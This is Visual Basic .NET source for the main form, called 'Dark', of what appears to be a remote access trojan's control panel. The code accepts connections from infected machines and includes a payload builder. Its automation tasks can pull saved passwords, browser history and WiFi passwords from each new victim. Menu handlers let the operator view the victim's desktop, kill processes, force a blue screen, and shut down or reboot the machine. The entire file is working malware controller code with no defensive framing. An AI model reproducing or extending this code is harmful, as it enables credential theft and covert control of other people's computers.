Imports System.ComponentModel
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Text
Imports System.Threading
Imports PacketLib.Packet

Public Class Dark

    Private LIST_OF_SERVERS As New List(Of TcpListener)
    Public Shared L As New List(Of Clients)

    Public Settings As New Settings_Form
    Public Setting_T As Thread

    Public Builder As New Builder_Form
    Public Builder_T As Thread

    Public Mass_Task As New Mass_form
    Public Mass_Task_T As Thread

    Public TestBytes As Byte() = Encoding.Default.GetBytes("")

    Public Sub CheckClient(ByVal k As Clients)

        While True

            Thread.Sleep(2000)

            Try
                k.C.GetStream.WriteAsync(TestBytes, 0, TestBytes.Length)

            Catch ex As Exception

                For Each Cli As Clients In L

                    If Cli.C.Client.RemoteEndPoint.ToString = k.C.Client.RemoteEndPoint.ToString Then

                        Try

                            For Each h As ListViewItem In AeroListView1.Items

                                If h.Text = Cli.C.Client.RemoteEndPoint.ToString Then

                                    AeroListView1.Items.Remove(h)

                                End If

                            Next

                        Catch ex

                        End Try

                        Try
                            L.Remove(k)

                            L.Remove(Cli)
                        Catch ex

                        End Try

                        Exit Sub

                    End If

                Next

            End Try

        End While

    End Sub

    Public Sub Automation_Tasks(ByVal C As Clients)

        Thread.Sleep(100)

        If Settings.Pass_CHK.Checked = True Then

            Dim P As New PacketMaker

            P.Type_Packet = PacketType.PLUGIN

            P.Plugin = Plugins._PW

            C.Sender(P)

            Thread.Sleep(100)

        End If

        If Settings.Hist_CHK.Checked = True Then

            Dim P2 As New PacketMaker

            P2.Type_Packet = PacketType.PLUGIN

            P2.Plugin = Plugins._WB

            C.Sender(P2)

            Thread.Sleep(100)

        End If

        If Settings.WF_CHK.Checked = True Then

            Dim P2 As New PacketMaker

            P2.Type_Packet = PacketType.PLUGIN

            P2.Plugin = Plugins._W_PW

            C.Sender(P2)

        End If

    End Sub

    Public Sub Start()

        If Settings.Button1.Text = "Listen !" Then

            L = New List(Of Clients)

            LIST_OF_SERVERS = New List(Of TcpListener)

            For Each I As ListViewItem In Settings.AeroListView1.Items

                Dim S As New TcpListener(IPAddress.Any, I.Text)

                S.Start()

                LIST_OF_SERVERS.Add(S)

                Task.Factory.StartNew(Sub() D(S, I.Text), CancellationToken.None, TaskCreationOptions.LongRunning)

            Next

            Settings.Button1.Text = "Started !"

        Else

            For Each tcpListener As TcpListener In LIST_OF_SERVERS

                tcpListener.Stop()

            Next

            LIST_OF_SERVERS.Clear()

            L.Clear()

            AeroListView1.Items.Clear()

            Settings.Button1.Text = "Listen !"

        End If

    End Sub

    Public Sub D(ByVal T As TcpListener, ByVal port As Integer)

        Try

            While True

                Dim Y As New Clients

                Y.C = T.AcceptTcpClient

                Y.ID = Y.C.Client.RemoteEndPoint.ToString

                Y.Local_Port = port

                L.Add(Y)

                Dim B As BinaryFormatter = New BinaryFormatter()

                Dim p As PacketMaker = New PacketMaker()

                p.Type_Packet = PacketType.ID

                Task.Run(Sub() CheckClient(Y))

                Dim Run_T As New Thread(Sub() R(Y, Y.C.GetStream, port))

                Run_T.Start()

                Y.Sender(p)

                Task.Run(Sub() Automation_Tasks(Y))

            End While

        Catch ex As Exception

        End Try

    End Sub

    Public Async Sub R(ByVal C As Clients, ByVal L As NetworkStream, ByVal Port As String)

        Try

            While True

                Dim sf As BinaryFormatter = New BinaryFormatter()

                Dim packet As PacketMaker = CType(sf.Deserialize(L), PacketMaker)

                Try


                    Select Case packet.Type_Packet

                        Case PacketType.ID
                            Await Task.Run(Sub() Countries.GetFlags(C.C.Client.RemoteEndPoint.ToString, ImageList1, AeroListView1, packet.Misc, Port))
                          '  Task.Run(Sub() Countries.GetFlags(C.C.Client.RemoteEndPoint.ToString, ImageList1, AeroListView1, packet.Misc, Port))
                     '   GetFlags(C.C.Client.RemoteEndPoint.ToString, ImageList1, packet.Misc, Port)
                        Case PacketType.PW

                            Dim T As New Thread(Sub() C.SetPW(packet.Misc))
                            T.Start()

                        Case PacketType.HIST

                            Dim T As New Thread(Sub() C.SetHist(packet.Misc))

                            T.Start()

                        Case PacketType.W_PW

                            Dim T As New Thread(Sub() C.SetW_PW(packet.Misc))

                            T.Start()

                        Case PacketType.TASKS

                            Dim Subject As Packet_Subject = CType(packet.Misc(0), Packet_Subject)

                            Select Case Subject

                                Case Packet_Subject.RETRIEVE_TASKS

                                    Dim T As New Thread(Sub() C.Set_Tasks(packet.Misc(1)))

                                    T.Start()

                                Case Packet_Subject.KILL_TASK

                                    Dim T As New Thread(Sub() C.Set_Delete_Proc(packet.Misc))

                                    T.Start()

                            End Select

                        Case PacketType.RD

                            ThreadPool.QueueUserWorkItem(Sub() C.SetRD(packet.Misc))


                        Case PacketType.ERROR_LOAD_NATIVE_DLL

                            Dim T As New Thread(Sub() MessageBox.Show(packet.Misc(0)))

                            T.Start()

                        Case PacketType.SUCCESS_LOAD_NATIVE_DLL

                            Dim T As New Thread(Sub() MessageBox.Show(packet.Misc(0)))

                            T.Start()

                    End Select

                Catch ex As Exception

                End Try

            End While

        Catch ex As Exception

        End Try

    End Sub


    Private Sub SettingsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SettingsToolStripMenuItem.Click

        Helpers.Form_Checker(Settings, Setting_T)

    End Sub

    Private Sub Custom_Button1_Click(sender As Object, e As EventArgs) Handles Close_BTN.Click

        Dim currentProcess As Process = Process.GetCurrentProcess()

        NativeAPI.NtTerminateProcess(currentProcess.Handle, 0)

    End Sub

    Private Sub LoginToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LoginToolStripMenuItem.Click

        If (Me.AeroListView1.SelectedItems.Count = 1) Then

            For Each H As Clients In L

                If (Me.AeroListView1.SelectedItems(0).Text = H.C.Client.RemoteEndPoint.ToString) Then

                    If (H.Main_Form IsNot Nothing) Then

                        H.Main_Form.Text = H.ID

                        H.Main_Form.Label1.Text = H.ID

                        H.Main_Form.PictureBox1.Image = AeroListView1.SelectedItems(0).ImageList.Images(AeroListView1.SelectedItems(0).Index)

                        Dim B As New Bitmap(H.Main_Form.PictureBox1.Image)

                        H.Main_Form.Icon = Icon.FromHandle(B.GetHicon)

                        '     Dim thread As Thread = New Thread(Sub() Application.Run(H.Main_Form))
                        Task.Run(Sub() Application.Run(H.Main_Form))
                        '     thread.Start()

                    Else

                        H.Main_Form = New Client_Form(H)

                        H.Main_Form.Text = H.ID

                        H.Main_Form.Label1.Text = H.ID

                        H.Main_Form.PictureBox1.Image = AeroListView1.SelectedItems(0).ImageList.Images(AeroListView1.SelectedItems(0).Index)

                        Dim B As New Bitmap(H.Main_Form.PictureBox1.Image)

                        H.Main_Form.Icon = Icon.FromHandle(B.GetHicon)

                        Dim thread2 As Thread = New Thread(Sub() Application.Run(H.Main_Form))

                        thread2.Start()

                    End If

                    Exit For

                End If

            Next

        End If

    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load

        If IO.File.Exists("Settings.ini") Then

            Dim P As String() = Split(IO.File.ReadAllText("Settings.ini"), ",")

            If P(0) = "1" Then

                Settings.Pass_CHK.Checked = True

            End If

            If P(1) = "1" Then

                Settings.Hist_CHK.Checked = True

            End If

            If P(2) = "1" Then

                Settings.WF_CHK.Checked = True

            End If

        End If

        AddHandler Settings_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(Settings_Pic)
        AddHandler Settings_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(Settings_Pic)
        AddHandler Settings_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(Settings_Pic)
        AddHandler Settings_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(Settings_Pic)

        AddHandler Login_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(Login_Pic)
        AddHandler Login_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(Login_Pic)
        AddHandler Login_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(Login_Pic)
        AddHandler Login_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(Login_Pic)

        AddHandler Mass_Tasks_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(Mass_Tasks_Pic)
        AddHandler Mass_Tasks_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(Mass_Tasks_Pic)
        AddHandler Mass_Tasks_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(Mass_Tasks_Pic)
        AddHandler Mass_Tasks_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(Mass_Tasks_Pic)

        AddHandler Build_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(Build_Pic)
        AddHandler Build_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(Build_Pic)
        AddHandler Build_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(Build_Pic)
        AddHandler Build_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(Build_Pic)

        AddHandler RV_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(RV_Pic)
        AddHandler RV_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(RV_Pic)
        AddHandler RV_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(RV_Pic)
        AddHandler RV_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(RV_Pic)


        AddHandler Pass_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(Pass_Pic)
        AddHandler Pass_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(Pass_Pic)
        AddHandler Pass_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(Pass_Pic)
        AddHandler Pass_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(Pass_Pic)


        AddHandler W_Pass_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(W_Pass_Pic)
        AddHandler W_Pass_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(W_Pass_Pic)
        AddHandler W_Pass_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(W_Pass_Pic)
        AddHandler W_Pass_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(W_Pass_Pic)


        AddHandler Hist_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(Hist_Pic)
        AddHandler Hist_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(Hist_Pic)
        AddHandler Hist_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(Hist_Pic)
        AddHandler Hist_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(Hist_Pic)

        AddHandler BSOD_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(BSOD_Pic)
        AddHandler BSOD_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(BSOD_Pic)
        AddHandler BSOD_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(BSOD_Pic)
        AddHandler BSOD_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(BSOD_Pic)

        AddHandler Reboot_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(Reboot_Pic)
        AddHandler Reboot_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(Reboot_Pic)
        AddHandler Reboot_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(Reboot_Pic)
        AddHandler Reboot_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(Reboot_Pic)

        AddHandler LogOut_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(LogOut_Pic)
        AddHandler LogOut_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(LogOut_Pic)
        AddHandler LogOut_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(LogOut_Pic)
        AddHandler LogOut_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(LogOut_Pic)

        AddHandler Sleep_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(Sleep_Pic)
        AddHandler Sleep_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(Sleep_Pic)
        AddHandler Sleep_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(Sleep_Pic)
        AddHandler Sleep_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(Sleep_Pic)

        AddHandler Hibernate_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(Hibernate_Pic)
        AddHandler Hibernate_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(Hibernate_Pic)
        AddHandler Hibernate_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(Hibernate_Pic)
        AddHandler Hibernate_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(Hibernate_Pic)

        AddHandler Shutdown_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(Shutdown_Pic)
        AddHandler Shutdown_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(Shutdown_Pic)
        AddHandler Shutdown_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(Shutdown_Pic)
        AddHandler Shutdown_Pic.MouseLeave, Sub() ChangeColor_MouseUp_Pic(Shutdown_Pic)

    End Sub
    Public Sub ChangeColor_MouseDown_Pic(ByVal Pic As PictureBox)

        Pic.BackColor = Color.FromArgb(56, 66, 79)

    End Sub
    Public Sub ChangeColor_MouseUp_Pic(ByVal Pic As PictureBox)

        Pic.BackColor = Color.FromArgb(16, 26, 39)

    End Sub
    Public Sub ChangeColor_MouseHover_Pic(ByVal Pic As PictureBox)

        Pic.BackColor = Color.FromArgb(36, 46, 59)

    End Sub

    Private Sub BuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuilderToolStripMenuItem.Click

        Helpers.Form_Checker(Builder, Builder_T)

    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click

        For Each C As Clients In L

            If C.ID = AeroListView1.SelectedItems(0).Text Then

                Dim p As PacketMaker = New PacketMaker()

                p.Type_Packet = PacketType.MSG

                '    Task.Run(Sub() Helpers.Sender(C, p))
                Task.Run(Sub() C.Sender(p))

            End If

        Next

    End Sub

    Private Sub RDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RDToolStripMenuItem.Click

        If (Me.AeroListView1.SelectedItems.Count = 1) Then

            Try

                For Each H As Clients In L

                    If AeroListView1.SelectedItems(0).Text = H.C.Client.RemoteEndPoint.ToString Then

                        If Not H.Viewer Is Nothing Then

                            H.Viewer.Text = H.C.Client.RemoteEndPoint.ToString

                            H.Viewer.Label1.Text = H.C.Client.RemoteEndPoint.ToString

                            Dim O As Thread = New Thread(Sub()
                                                             Application.Run(H.Viewer)
                                                         End Sub)
                            O.Start()

                        Else
                            H.Viewer = New RD_Form(H)

                            H.Viewer.Text = H.C.Client.RemoteEndPoint.ToString()

                            Dim O2 As Thread = New Thread(Sub()
                                                              Application.Run(H.Viewer)
                                                          End Sub)
                            O2.Start()

                        End If

                        Exit For

                    End If

                Next

            Catch ex As Exception

            End Try

        End If

    End Sub

    Private Sub MassTasksToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MassTasksToolStripMenuItem.Click

        Helpers.Form_Checker(Mass_Task, Mass_Task_T)

    End Sub

    Private Sub Build_Pic_Click(sender As Object, e As EventArgs) Handles Build_Pic.Click

        Helpers.Form_Checker(Builder, Builder_T)

    End Sub

    Private Sub Settings_Pic_Click(sender As Object, e As EventArgs) Handles Settings_Pic.Click

        Helpers.Form_Checker(Settings, Setting_T)

    End Sub

    Private Sub Mass_Tasks_Pic_Click(sender As Object, e As EventArgs) Handles Mass_Tasks_Pic.Click

        Helpers.Form_Checker(Mass_Task, Mass_Task_T)

    End Sub

    Private Sub Login_Pic_Click(sender As Object, e As EventArgs) Handles Login_Pic.Click

        If (Me.AeroListView1.SelectedItems.Count = 1) Then

            For Each H As Clients In L

                If (Me.AeroListView1.SelectedItems(0).Text = H.C.Client.RemoteEndPoint.ToString) Then

                    If (H.Main_Form IsNot Nothing) Then

                        H.Main_Form.Text = H.ID

                        H.Main_Form.Label1.Text = H.ID

                        H.Main_Form.PictureBox1.Image = AeroListView1.SelectedItems(0).ImageList.Images(AeroListView1.SelectedItems(0).Index)

                        Dim B As New Bitmap(H.Main_Form.PictureBox1.Image)

                        H.Main_Form.Icon = Icon.FromHandle(B.GetHicon)
                        '     Dim thread As Thread = New Thread(Sub() Application.Run(H.Main_Form))
                        Task.Run(Sub() Application.Run(H.Main_Form))
                        '     thread.Start()
                    Else

                        H.Main_Form = New Client_Form(H)

                        H.Main_Form.Text = H.ID

                        H.Main_Form.Label1.Text = H.ID

                        H.Main_Form.PictureBox1.Image = AeroListView1.SelectedItems(0).ImageList.Images(AeroListView1.SelectedItems(0).Index)

                        Dim B As New Bitmap(H.Main_Form.PictureBox1.Image)

                        H.Main_Form.Icon = Icon.FromHandle(B.GetHicon)

                        Dim thread2 As Thread = New Thread(Sub() Application.Run(H.Main_Form))

                        thread2.Start()

                    End If

                    Exit For

                End If
            Next

        End If

    End Sub

    Private Sub RV_Pic_Click(sender As Object, e As EventArgs) Handles RV_Pic.Click

        If (Me.AeroListView1.SelectedItems.Count = 1) Then

            Try

                For Each H As Clients In L

                    If AeroListView1.SelectedItems(0).Text = H.C.Client.RemoteEndPoint.ToString Then

                        If Not H.Viewer Is Nothing Then

                            H.Viewer.Text = H.C.Client.RemoteEndPoint.ToString

                            H.Viewer.Label1.Text = H.C.Client.RemoteEndPoint.ToString

                            Dim O As Thread = New Thread(Sub()
                                                             Application.Run(H.Viewer)
                                                         End Sub)

                            O.Start()

                        Else
                            H.Viewer = New RD_Form(H)

                            H.Viewer.Text = H.C.Client.RemoteEndPoint.ToString()

                            Dim O2 As Thread = New Thread(Sub()
                                                              Application.Run(H.Viewer)
                                                          End Sub)

                            O2.Start()

                        End If

                        Exit For
                    End If

                Next

            Catch ex As Exception

            End Try

        End If
    End Sub

    Private Async Sub Pass_Pic_Click(sender As Object, e As EventArgs) Handles Pass_Pic.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim P As New PacketMaker

            P.Type_Packet = PacketType.PLUGIN

            P.Plugin = Plugins._PW

            For Each U As Clients In Dark.L

                If U.ID = AeroListView1.SelectedItems(0).Text Then

                    U.Main_Form.Loading_PW.Visible = True

                    U.Main_Form.Loading_PW.Active = True

                    '  Await Task.Run(Sub() Helpers.Sender(U, P))

                    Await Task.Run(Sub() U.Sender(P))

                    Exit For

                End If

            Next

        End If

    End Sub

    Private Async Sub Hist_Pic_Click(sender As Object, e As EventArgs) Handles Hist_Pic.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim P As New PacketMaker

            P.Type_Packet = PacketType.PLUGIN

            P.Plugin = Plugins._WB

            For Each U As Clients In Dark.L

                If U.ID = AeroListView1.SelectedItems(0).Text Then

                    U.Main_Form.Loading_Hist.Visible = True

                    U.Main_Form.Loading_Hist.Active = True

                    Await Task.Run(Sub() U.Sender(P))

                    Exit For

                End If

            Next

        End If

    End Sub

    Private Async Sub W_Pass_Pic_Click(sender As Object, e As EventArgs) Handles W_Pass_Pic.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim P As New PacketMaker

            P.Type_Packet = PacketType.PLUGIN

            P.Plugin = Plugins._W_PW

            For Each U As Clients In Dark.L

                If U.ID = AeroListView1.SelectedItems(0).Text Then

                    U.Main_Form.Loading_W_PW.Visible = True

                    U.Main_Form.Loading_W_PW.Active = True

                    Await Task.Run(Sub() U.Sender(P))

                    Exit For

                End If

            Next

        End If

    End Sub

    Private Async Sub Shutdown_Pic_Click(sender As Object, e As EventArgs) Handles Shutdown_Pic.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim P As New PacketMaker

            P.Type_Packet = PacketType.PLUGIN

            P.Plugin = Plugins._MS

            P.Function_Params = New Object() {Packet_Subject.SHUTDOWN}

            For Each U As Clients In Dark.L

                If U.ID = AeroListView1.SelectedItems(0).Text Then

                    Await Task.Run(Sub() U.Sender(P))

                    Exit For

                End If

            Next

        End If

    End Sub

    Private Async Sub Hibernate_Pic_Click(sender As Object, e As EventArgs) Handles Hibernate_Pic.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim P As New PacketMaker

            P.Type_Packet = PacketType.PLUGIN

            P.Plugin = Plugins._MS

            P.Function_Params = New Object() {Packet_Subject.HIBERNATE}

            For Each U As Clients In Dark.L

                If U.ID = AeroListView1.SelectedItems(0).Text Then

                    Await Task.Run(Sub() U.Sender(P))

                    Exit For

                End If

            Next

        End If

    End Sub

    Private Async Sub BSOD_Pic_Click(sender As Object, e As EventArgs) Handles BSOD_Pic.Click

        If AeroListView1.SelectedItems.Count = 1 Then
            Dim P As New PacketMaker

            P.Type_Packet = PacketType.PLUGIN

            P.Plugin = Plugins._MS

            P.Function_Params = New Object() {Packet_Subject.BSOD}

            For Each U As Clients In Dark.L

                If U.ID = AeroListView1.SelectedItems(0).Text Then

                    Await Task.Run(Sub() U.Sender(P))

                    Exit For

                End If

            Next

        End If

    End Sub

    Private Async Sub LogOut_Pic_Click(sender As Object, e As EventArgs) Handles LogOut_Pic.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim P As New PacketMaker

            P.Type_Packet = PacketType.PLUGIN

            P.Plugin = Plugins._MS

            P.Function_Params = New Object() {Packet_Subject.LOG_OUT}

            For Each U As Clients In Dark.L

                If U.ID = AeroListView1.SelectedItems(0).Text Then

                    Await Task.Run(Sub() U.Sender(P))

                    Exit For

                End If

            Next

        End If

    End Sub

    Private Async Sub Sleep_Pic_Click(sender As Object, e As EventArgs) Handles Sleep_Pic.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim P As New PacketMaker

            P.Type_Packet = PacketType.PLUGIN

            P.Plugin = Plugins._MS

            P.Function_Params = New Object() {Packet_Subject.SUSPEND}

            For Each U As Clients In Dark.L

                If U.ID = AeroListView1.SelectedItems(0).Text Then

                    Await Task.Run(Sub() U.Sender(P))

                    Exit For

                End If

            Next

        End If

    End Sub

    Private Async Sub Reboot_Pic_Click(sender As Object, e As EventArgs) Handles Reboot_Pic.Click

        If AeroListView1.SelectedItems.Count = 1 Then

            Dim P As New PacketMaker

            P.Type_Packet = PacketType.PLUGIN

            P.Plugin = Plugins._MS

            P.Function_Params = New Object() {Packet_Subject.REBOOT}

            For Each U As Clients In Dark.L

                If U.ID = AeroListView1.SelectedItems(0).Text Then

                    Await Task.Run(Sub() U.Sender(P))

                    Exit For

                End If

            Next

        End If

    End Sub

End Class
